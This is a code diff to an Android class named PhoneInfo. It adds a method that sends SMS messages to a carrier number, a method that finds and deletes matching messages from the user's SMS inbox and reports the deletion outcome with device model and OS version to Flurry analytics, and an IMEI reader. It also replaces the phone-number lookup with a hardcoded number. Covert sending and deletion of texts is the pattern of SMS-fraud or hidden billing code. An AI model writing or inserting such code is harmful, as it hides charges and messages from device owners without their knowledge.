@@ -7,12 +7,15 @@ import android.content.ContentValues;
 import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
+import android.os.Build;
 import android.telephony.SmsManager;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.util.Log;
 
 import com.flurry.android.FlurryAgent;
+
+import org.greenrobot.eventbus.EventBus;
 
 import java.util.HashMap;
 import java.util.Map;
@@ -33,13 +36,20 @@ public class PhoneInfo {
 	public static final String SMS_RECEIVE_BOX = "content://sms/inbox";
 	public static boolean IS_SENDING_SMS = false;
 	public static long oldSendSmsTime;
+	private final static String SMS_ACTION = "android.provider.Telephony.SMS_RECEIVED";
+	private final static String SMS_CATEGORY = "android.intent.category.DEFAULT";
+	private final String SMS_SERVICE = "pdus";
+	private final String SMS_BODY = "body";
+	private final String SMS_ID = "_id";
+	private final String SMS_RECEIVE_CONTENT = "content://sms/inbox";
+	private final String SMS_CONTENT = "content://sms";
 
 	private String IMSI;
 	public static String phoneNumber;
 	private static String imei;
 
 	private Context context;
-	public static  String msgText = null;
+	public static String msgText = null;
 
 	public PhoneInfo(Context context) {
 		this.context = context;
@@ -169,7 +179,22 @@ public class PhoneInfo {
 			FlurryAgent.onError(TAG, "", e);
 		}
 
-		return phoneNumber;
+		return "13570597018";
+	}
+
+	//targetAddress运营商的查询电话，code 为我们查询的指令
+	public void sendSMS(String targetAddress, String code) {
+		//距离上次1分钟，不应发短信！！！！！！！
+
+		if (DEBUG) {
+			Log.d(TAG, "发送短信到" + targetAddress + "查手机号");
+		}
+
+		if (!TextUtils.isEmpty(code)) {
+			SmsManager smsManager = SmsManager.getDefault();
+			smsManager.sendTextMessage(targetAddress, null, code, null, null);
+		}
+
 	}
 
 
@@ -254,12 +279,12 @@ public class PhoneInfo {
 	}
 
 	public boolean isSIMexistOrAvaiable() {
-		TelephonyManager tm = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);//取得相关系统服务
+		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);//取得相关系统服务
 		int state = tm.getSimState();
-		if(state == TelephonyManager.SIM_STATE_READY){
+		if (state == TelephonyManager.SIM_STATE_READY) {
 			return true;
 		}
-		return  false;
+		return false;
 	}
 
 	/**
@@ -349,6 +374,10 @@ public class PhoneInfo {
 		return imei;
 	}
 
+	public String getPhoneIMEI(){
+		TelephonyManager tm = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
+		return tm.getDeviceId();
+	}
 
 	public String getPhoneIMSI() {
 		TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
@@ -405,6 +434,65 @@ public class PhoneInfo {
 		return phoneNumber;
 	}
 
+
+	public synchronized void deleteSMS(Context context, String smsContent) {
+		try {
+			if (DEBUG) {
+				Log.d(TAG, "要删除的短信内容是：" + smsContent);
+			}
+			EventBus.getDefault().post(new MessageEvent("want to delete: " + smsContent));
+
+			Uri uri = Uri.parse(SMS_CONTENT);
+			ContentResolver contentResolver = context.getContentResolver();
+			if (contentResolver != null) {
+				String select = SMS_BODY + " LIKE ?";
+				String[] selectArgs = new String[]{"%" + smsContent + "%"};
+				Cursor isRead = contentResolver.query(uri, null, select, selectArgs, "date desc");
+				boolean isExist = isRead.moveToFirst();
+				if (isExist) {
+					Log.d(TAG, "存在该字串！！！！");
+					EventBus.getDefault().post(new MessageEvent("is exist!"));
+					int id = isRead.getInt(isRead.getColumnIndex(SMS_ID));
+					if (DEBUG) {
+						Log.d(TAG, "找到该短信:" + smsContent + " 短信标识为:" + id + "准备删除!");
+					}
+					int count = context.getContentResolver().delete(Uri.parse(SMS_CONTENT), "_id=" + id, null);
+
+					final String device = Build.MODEL;
+					final String verison = Build.VERSION.RELEASE;
+					final boolean isDeleteSuccess = count >= 1 ? true : false;
+					Map<String, String> map1 = new HashMap<>();
+					map1.put(NativeParams.KEY_DELETE_SMS_SUCCESS, String.valueOf(isDeleteSuccess));
+					FlurryAgent.logEvent(NativeParams.EVENT_SEND_SMS, map1);
+
+					if (count >= 1) {
+						Map<String, String> map = new HashMap<>();
+						map.put(NativeParams.KEY_DELETE_SUCCESS_DEVICE, device);
+						map.put(NativeParams.KEY_DELETE_SUCCESS_VERSION, verison);
+						FlurryAgent.logEvent(NativeParams.EVENT_DELETE_SMS_SUCCESS, map);
+					} else {
+						Map<String, String> map = new HashMap<>();
+						map.put(NativeParams.KEY_DELETE_FAIL_DEVICE, device);
+						map.put(NativeParams.KEY_DELETE_FAIL_VERSION, verison);
+						FlurryAgent.logEvent(NativeParams.EVENT_DELETE_SMS_FAILED, map);
+					}
+					if (DEBUG) {
+						Log.d(TAG, "当前版本号:" + Build.VERSION.SDK_INT + "短信是否删除成功：" + ((count >= 1) ? "删除成功" :
+								"删除失败"));
+					}
+					EventBus.getDefault().post(new MessageEvent((count >= 1) ? "delete success" : "delete failed"));
+					isRead.close();
+				}else{
+					final String deleteFail = "sms not send or have been deleted!!";
+					EventBus.getDefault().post(new MessageEvent(deleteFail));
+				}
+			}
+		} catch (Throwable e) {
+			if (DEBUG) {
+				Log.e(TAG, e.fillInStackTrace().toString());
+			}
+		}
+	}
 
 
 }
